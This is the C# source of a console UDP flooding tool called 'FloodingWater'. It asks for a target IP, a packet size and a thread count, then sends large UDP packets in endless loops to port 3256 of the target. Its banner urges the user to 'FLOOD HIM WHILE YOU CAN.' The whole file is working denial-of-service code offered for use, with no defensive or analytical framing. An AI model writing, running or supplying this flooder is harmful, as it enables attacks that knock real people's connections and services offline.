///edited by mrkoolaid
///

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Net;
using System.Threading;

namespace FloodingWater
{
    class Program
    {    
        static void Main(string[] args)
        {
            string ip = string.Empty;
            int pbytes = 0, threads = 0;

            showInfo();

            while (true)
            {
                try
                {
                    Console.Write("IP (ex; 127.0.0.1): ");
                    ip = Console.ReadLine();

                    Console.Write("Packet Size (kb): ");
                    pbytes = Convert.ToInt32(Console.ReadLine());

                    Console.Write("Threads: ");
                    threads = Convert.ToInt32(Console.ReadLine());

                    //make sure we have an IP to work with
                    if (ip.Length <= 0 && ip == null)
                    {
                        showInfo();
                        Environment.Exit(0);
                    }

                    //loop through and create the threads and run them
                    for (int i = 0; i < threads; i++)
                    {
                        FloodingWater flooder = new FloodingWater(ip, pbytes);
                    }

                    //i moved from your if statement to a switch which will make it easier to implement other commands
                    switch (Console.ReadLine())
                    {
                        case "Q":
                            //cleanup and quit
                            Environment.Exit(0);
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.Clear();
                    Console.WriteLine(ex.Message);
                }
            }
        }

        static void showInfo()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("FLOODING WATER. FLOOD HIM WHILE YOU CAN.\nHow to use:");
            Console.WriteLine("\tWrite 'Q' to quit.\n");
        }
    }

    class FloodingWater
    {
        private Thread t;

        public FloodingWater(string ip, int pbytes)
        {
            t = new Thread(() => this.Flood(ip, pbytes, false));
            t.Start();
        }

        /// <summary>
        /// Flood method
        /// </summary>
        /// <param name="ip">IP address to flood</param>
        /// <param name="size">Size of the packet</param>
        public void Flood(string ip, int size, bool upnp)
        {
            int count = 0, port = 3256;
            IPEndPoint ep;

            while (true)
            {
                try
                {
                    byte[] pbytes = new byte[size * 1024];
                    
                    ep = new IPEndPoint(IPAddress.Parse(ip), port);

                    SocketType st = SocketType.Dgram;
                    ProtocolType pt = ProtocolType.Udp;

                    Socket sock = new Socket(AddressFamily.InterNetwork, st, pt);
                    sock.SendTo(pbytes, ep);
                    count++;

                    Console.Clear();
                    Console.WriteLine("Sent {0} packets!", count);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    break;
                }
            }
        }
    }
}
